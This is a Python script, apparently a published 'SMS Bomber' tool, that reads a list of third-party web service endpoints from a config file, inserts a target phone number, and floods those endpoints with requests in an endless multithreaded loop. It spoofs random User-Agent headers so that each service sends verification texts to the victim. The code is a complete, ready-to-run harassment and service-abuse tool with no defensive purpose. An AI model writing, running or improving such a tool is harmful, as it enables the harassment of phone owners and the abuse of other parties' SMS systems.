import os
import requests
import json
import time
from colorama import Fore
from random_header_generator import HeaderGenerator
from concurrent.futures import ThreadPoolExecutor

banner = (Fore.GREEN + """
            ███╗░░██╗██╗███╗░░░███╗░█████╗░
            ████╗░██║██║████╗░████║██╔══██╗
            ██╔██╗██║██║██╔████╔██║███████║
            ██║╚████║██║██║╚██╔╝██║██╔══██║
            ██║░╚███║██║██║░╚═╝░██║██║░░██║
            ╚═╝░░╚══╝╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
""")

info = (Fore.GREEN + """
Github : https://github.com/nimawebdev
Version: 1.0.0
""")

def load_config():
    with open('bomberdata.json') as f:
        return json.load(f)

def send_request(service, number, headers):
    payload = service['json']
    for key in payload:
        if 'phnum' in payload[key]:
            payload[key] = payload[key].replace('phnum', number)
        elif '0phnum' in payload[key]:
            payload[key] = payload[key].replace('0phnum', '0' + number)
    response = requests.post(url=service['url'], json=payload, headers=headers)
    print(f"{service['name']} Response: {response.status_code}")

def smsbomber(number):
    config = load_config()
    generator = HeaderGenerator(user_agents='scrape')
    headers = generator()
    selected_headers = {
        'User-Agent': headers.get('User-Agent'),
        'Accept': headers.get('Accept', '*/*')
    }
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            for service in config['services']:
                executor.submit(send_request, service, number, selected_headers)
            time.sleep(0.5)

def requirements():
    os_type = os.name
    print(Fore.GREEN)
    if os_type != 'nt':
        os.system("pkg install python")
    os.system("pip install colorama requests random-header-generator")
    os.system("cls" if os_type == 'nt' else "clear")
    menu()

def menu():
    print(banner)
    print(info)
    print(Fore.WHITE + """
    1.SMS Bomber
    2.Check requirements
    3.Exit/Quit
    """)
    ans = input("Select Your Choice --> ")
    if ans == "1":
        print("\nLoading...")
        number = input(Fore.BLUE + "\n\nEnter your Phone Number" + Fore.RED + " (without 0)  -->  " + Fore.WHITE)
        smsbomber(number)
    elif ans == "2":
        print(Fore.WHITE + "\nLoading...")
        requirements()
    elif ans == "3":
        time.sleep(0.5)
        exit()
    else:
        print("\n Not Valid Choice. Try again")
        menu()

# Open menu
menu()
